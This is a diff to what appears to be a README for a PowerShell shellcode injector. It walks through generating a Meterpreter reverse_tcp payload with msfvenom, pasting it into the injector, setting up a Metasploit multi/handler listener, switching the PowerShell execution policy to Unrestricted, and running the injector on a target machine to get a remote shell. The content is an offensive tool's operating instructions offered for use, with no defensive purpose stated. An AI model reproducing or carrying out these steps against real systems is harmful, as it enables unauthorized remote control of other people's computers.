@@ -41,14 +41,42 @@ The OpenProcess function is used to get a handle to the process with the specifi
 
 
 First we need the shellcode, to create shellcode we will use msfvenom:
+
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1
+
+copy the shellcode and paste it in the injector like so:
+![image](https://user-images.githubusercontent.com/68971838/210256780-c6cb4897-9a04-4515-acce-8ae28705aef2.png)
+
 
 Now set up a listener in the Metasploit Framework (MSF), you first need to start the MSF console:
 
 msfconsole
+
 use multi/handler
+
 set PAYLOAD windows/x64/meterpreter/reverse_tcp 
+
 set LHOST IP
+
 set LPORT PORT
+
+
+Now run the injector on the target machine:
+
+Note:
+If you have a script that you need to run and the execution policy is set to Restricted, you can bypass the execution policy:
+Set-ExecutionPolicy Unrestricted
+
+Now run in powershell prompt:
+./PSinjector
+
+and check ur listener:
+
+![image](https://user-images.githubusercontent.com/68971838/210256969-2ca9869f-7781-4888-88f4-fe7bb5a8b6bc.png)
+
+
+Author: SPNl48 :)))
+
+jenna Ortega fan 
 
 
